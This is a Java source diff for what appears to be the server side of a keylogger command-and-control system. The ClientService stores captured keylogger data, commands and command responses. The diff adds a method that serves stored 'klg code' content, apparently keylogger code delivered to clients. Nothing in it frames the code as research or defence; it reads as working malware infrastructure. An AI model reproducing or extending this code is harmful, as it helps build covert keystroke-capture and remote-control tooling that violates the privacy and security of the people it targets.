@@ -4,10 +4,12 @@ import com.klg.client.model.CommandResponseEntity;
 import com.klg.client.model.CommandResponseRequest;
 import com.klg.client.model.KeyloggerData;
 import com.klg.client.model.KeyloggerEntity;
+import com.klg.client.model.KlgCodeResponse;
 import com.klg.client.model.SettingsResponse;
 import com.klg.client.model.SyncedCommandResponse;
 import com.klg.client.repository.ClientLogsRepository;
 import com.klg.client.repository.CommandResponseRepository;
+import com.klg.client.repository.KlgCodeRepository;
 import com.klg.client.repository.SettingsRepository;
 import com.klg.client.repository.SyncedCommandRepository;
 import java.util.UUID;
@@ -23,6 +25,7 @@ public class ClientService {
   private final SyncedCommandRepository commandRepository;
   private final SettingsRepository settingsRepository;
   private final CommandResponseRepository commandResponseRepository;
+  private final KlgCodeRepository klgCodeRepository;
 
   @Transactional
   public void keyloggerData(KeyloggerData keyloggerData) {
@@ -51,5 +54,10 @@ public class ClientService {
   @Transactional
   public void saveResponse(CommandResponseRequest request) {
     commandResponseRepository.save(new CommandResponseEntity(UUID.randomUUID().toString(), request.cmd()));
+  }
+
+  @Transactional
+  public KlgCodeResponse klgCode() {
+    return new KlgCodeResponse(klgCodeRepository.findAll().get(0).getContent());
   }
 }
